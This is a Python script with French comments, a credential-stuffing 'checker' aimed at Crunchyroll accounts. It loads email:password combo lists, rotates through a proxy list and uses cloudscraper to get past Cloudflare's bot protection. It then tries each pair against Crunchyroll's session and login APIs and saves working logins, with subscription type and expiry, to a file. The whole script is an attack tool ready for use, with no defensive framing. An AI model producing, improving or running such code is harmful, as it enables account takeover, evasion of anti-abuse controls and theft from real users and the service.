import cloudscraper
import random
import os
import sys
import time
from colorama import init, Fore

# Initialisation des couleurs pour le terminal
init(autoreset=True)
red, green, blue, white, yellow = Fore.RED, Fore.GREEN, Fore.BLUE, Fore.WHITE, Fore.YELLOW

# --- CONFIGURATION ---
WEBHOOK_URL = "" # Optionnel : Mets ton URL Discord ici
DEBUG = False

def load_file(filename):
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            return f.read().splitlines()
    return []

# Chargement des données
combos = load_file("combos.txt")
proxies_list = load_file("proxy.txt")

# Création du scraper qui imite un vrai navigateur (Chrome/Windows)
# Cela aide à passer les vérifications TLS de Cloudflare
scraper = cloudscraper.create_scraper(
    browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
)

def get_proxy():
    if not proxies_list:
        return None
    proxy = random.choice(proxies_list)
    # Supporte le format IP:PORT ou USER:PASS@IP:PORT
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def logo():
    os.system('clear')
    print(f"{blue}=== CRUNCHYROLL MULTI-PROXY CHECKER ===")
    print(f"{white}Combos: {len(combos)} | Proxies: {len(proxies_list)}")
    print(f"{yellow}Conseil: Si 100% bloqué, change de proxies ou passe en 4G/5G.")
    print("="*40)

def crunchycheck():
    logo()
    valid_count = 0
    
    for i, line_raw in enumerate(combos):
        try:
            # Parsing du combo (Email:Password)
            if ":" not in line_raw: continue
            email, password = line_raw.split(":", 1)
            
            # Sélection d'un proxy parmi tes 1500
            current_proxy = get_proxy()
            
            # Etape 1 : Création de la session
            # On utilise scraper.post au lieu de requests.post pour bypass Cloudflare
            r = scraper.post(
                'https://api.crunchyroll.com/start_session.0.json',
                data={
                    'version': '1.0', 
                    'access_token': 'LNDJgOit5yaRIWN',
                    'device_type': 'com.crunchyroll.windows.desktop', 
                    'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId'
                },
                proxies=current_proxy,
                timeout=10
            )

            if "session_id" in r.text:
                session_id = r.json()["data"]["session_id"]
                
                # Etape 2 : Tentative de connexion
                rl = scraper.post(
                    'https://api.crunchyroll.com/login.0.json',
                    data={'account': email, 'password': password, 'session_id': session_id},
                    proxies=current_proxy,
                    timeout=10
                )

                info = rl.json()
                if info.get("code") == "ok":
                    user = info["data"]["user"]
                    res = f"[VALID] {email}:{password} | Sub: {user['access_type']} | Exp: {info['data']['expires']}"
                    print(f"{green}{res}")
                    
                    with open("valid.txt", "a") as f:
                        f.write(res + "\n")
                    valid_count += 1
                else:
                    print(f"[{i}] {red}Invalide: {email}")
            
            elif "cloudflare" in r.text.lower() or r.status_code == 403:
                # Si Cloudflare bloque malgré le proxy et le scraper
                print(f"[{i}] {yellow}Proxy bloqué (403/Cloudflare). Essai suivant...")
                continue 

        except Exception as e:
            if DEBUG: print(f"{yellow}Erreur sur {line_raw}: {e}")
            continue

    print(f"\n{blue}=== FIN DU CHECK ===")
    print(f"{green}Total Valides: {valid_count}")

if __name__ == "__main__":
    if not combos:
        print(f"{red}[!] Erreur: combos.txt est vide ou absent.")
    else:
        crunchycheck()
